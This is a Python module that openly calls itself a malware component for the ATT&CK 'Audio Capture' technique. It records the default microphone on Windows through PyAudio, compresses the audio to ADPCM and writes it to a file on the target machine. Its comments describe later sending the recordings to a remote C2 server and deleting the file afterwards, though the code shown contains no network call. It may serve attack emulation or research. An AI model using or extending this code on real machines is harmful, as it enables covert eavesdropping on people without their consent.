import pyaudio
import audioop
from os import path

# This module implements the Audio Capture technique (under the Collection tactic).
# The module captures the audio using a simple & default API called MME, which is found on most/all Windows machines.
# The module then compresses the audio to ADPCM encoding to save space on the target machine.
# The files can be later sent to a remote C2 server, then extracted back to linear PCM and played.

# Some restrictions:
#   1) The module is intended to be used on a Windows machine with the default MME API.
#   2) However, it is just a few lines of code away from working with Linux/Mac, thanks to the PyAudio library.
#   3) The module is potentially a part of a bigger malware that invokes audio grabs on demand then sends them out.


class Recorder:
    RATE = 44100
    ADPCM_OUTPUT_FILENAME = "output.adpcm"

    def __init__(self, duration=5):
        self.duration = duration
        self.stream = None
        self.audio = pyaudio.PyAudio()
        self.format = pyaudio.paInt32
        self.sample_size = self.audio.get_sample_size(self.format)
        self.channels = 2

    def attack(self):
        self.assert_preconditions()
        self.record()
        res = self.assert_postconditions()
        self.cleanup()
        return res

    # Make sure the MME API and 1 input device are available
    def assert_preconditions(self):
        device = self.audio.get_default_input_device_info()
        if self.get_host_api_name_of_device(device) == 'MME':
            self.channels = min(device.get('maxInputChannels'), self.channels)
        else:
            raise RuntimeError("MME API not detected")

    def get_host_api_name_of_device(self, device):
        return self.audio.get_host_api_info_by_index(device['hostApi'])['name']

    def record(self):
        self.open_stream()
        frames = self.read_stream()
        self.close_stream()
        self.write(self.compress(frames))

    def open_stream(self):
        self.stream = self.audio.open(format=self.format, channels=self.channels,
                                      rate=self.RATE, input=True, frames_per_buffer=self.sample_size)

    def read_stream(self):
        frames = []
        for i in range(0, int(self.RATE / self.sample_size * self.duration)):
            frames.append(self.stream.read(self.sample_size))
        return frames

    def close_stream(self):
        self.stream.stop_stream()
        self.stream.close()
        self.audio.terminate()

    def compress(self, frames):
        state = (None, None)
        for frame in frames:
            state = audioop.lin2adpcm(frame, self.sample_size, state[1])
            yield state[0]

    def write(self, compressed):
        with open(self.ADPCM_OUTPUT_FILENAME, 'wb') as f:
            f.write(b''.join(compressed))

    # Check if the file exists and whether it's in the correct size
    def assert_postconditions(self):
        try:
            bytes_per_second = self.RATE * self.sample_size * self.channels / 8  # divided by 8 for compression
            return path.getsize(self.ADPCM_OUTPUT_FILENAME) >= bytes_per_second * self.duration
        except FileNotFoundError:
            return False

    def cleanup(self):
        pass  # In context of a full malware, the output file will be deleted only after sending the data out


recorder = Recorder()
print(recorder.attack())
